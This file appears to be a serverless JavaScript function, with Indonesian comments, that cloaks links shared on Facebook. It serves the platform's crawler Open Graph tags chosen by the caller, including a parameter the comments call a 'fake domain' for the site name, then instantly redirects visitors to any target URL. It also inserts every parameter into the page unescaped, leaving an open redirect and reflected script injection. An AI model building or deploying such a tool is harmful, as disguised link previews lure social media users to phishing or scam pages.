export async function onRequest(context) {
  const { searchParams } = new URL(context.request.url);
  
  // Mengambil data dari URL yang dibuat bookmarklet
  const targetUrl = searchParams.get('u') || 'https://google.com';
  const title = searchParams.get('t') || 'Loading...';
  const image = searchParams.get('i') || '';
  const fakeDomain = searchParams.get('f') || ''; // Ini parameter fake domain

  // HTML yang dikirim khusus untuk Bot Facebook/Crawler
  const html = `<!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8">
    <title>${title}</title>
    <meta property="og:type" content="article">
    <meta property="og:title" content="${title}">
    <meta property="og:description" content="Click to view more...">
    <meta property="og:image" content="${image}">
    <meta property="og:url" content="${targetUrl}">
    
    ${fakeDomain ? `<meta property="og:site_name" content="${fakeDomain}">` : ''}
    
    <meta http-equiv="refresh" content="0;url=${targetUrl}">
    <script>window.location.replace("${targetUrl}");</script>
  </head>
  <body>
    Redirecting to <a href="${targetUrl}">${targetUrl}</a>...
  </body>
  </html>`;

  return new Response(html, {
    headers: { "content-type": "text/html;charset=UTF-8" },
  });
}
